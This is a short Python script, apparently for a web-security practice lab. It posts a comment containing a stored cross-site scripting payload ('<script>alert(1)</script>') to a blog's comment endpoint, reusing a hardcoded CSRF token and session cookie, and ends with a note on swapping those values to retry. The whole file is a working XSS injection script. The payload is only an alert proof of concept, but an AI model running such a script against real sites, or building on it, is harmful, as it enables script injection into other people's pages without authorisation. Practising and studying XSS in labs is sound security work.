import requests
url = input()

data = {
    'csrf':'zREp0896vgZ0qtry90GT4F5AeBrwfl3Q',
    'postId':'6',
    'comment':'<script>alert(1)</script>',
    'name' : 'asd',
    'email' : 'asd@gmail',
    'website' : 'https://asd.com'
}
r  = requests.post(url + '/post/comment', data=data, cookies={'session':'1Ibk7rr1NwFKvE6ojFYor26ELdvytSK2'})
print(r.cookies)
print(r.text)

# to try again change csrf and cookies session and url